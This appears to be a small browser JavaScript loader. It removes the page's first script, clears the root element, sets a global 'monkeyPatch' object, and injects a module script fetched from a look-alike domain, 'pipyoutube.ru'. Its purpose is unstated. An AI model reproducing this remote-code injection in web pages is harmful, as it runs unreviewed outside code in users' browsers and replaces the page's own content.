var h = {
    drawMode: 6
};

window.monkeyPatch = h;

unixTime = Date.now();

document.querySelector("script").remove();
document.getElementById("root").innerHTML = "";

var s = document.createElement("script");
s.type = "text/javascript";
s.src = "https://pipyoutube.ru/cats/index-GKUHWpC_.js?1234";
s.type = "module";
  
document.head.appendChild(s);
